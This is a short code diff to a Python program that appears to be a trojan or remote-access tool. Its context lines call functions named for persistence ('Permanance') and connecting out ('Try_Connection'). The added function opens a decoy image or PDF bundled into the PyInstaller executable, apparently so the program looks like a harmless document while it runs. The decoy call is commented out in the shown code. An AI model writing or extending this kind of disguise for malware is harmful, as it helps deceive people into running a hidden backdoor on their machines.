@@ -274,5 +274,10 @@ def Permanance():
     if os.path.exists(tro_file):
         pass
 
+def Open_Added_File():
+    added_file = sys._MEIPASS + "\\examplefile.pdf" #Enter the file after '\\' to open with image,pdf etc.
+    subprocess.Popen(added_file,shell=True)
+
+#Open_Added_File()
 Permanance()
 Try_Connection()
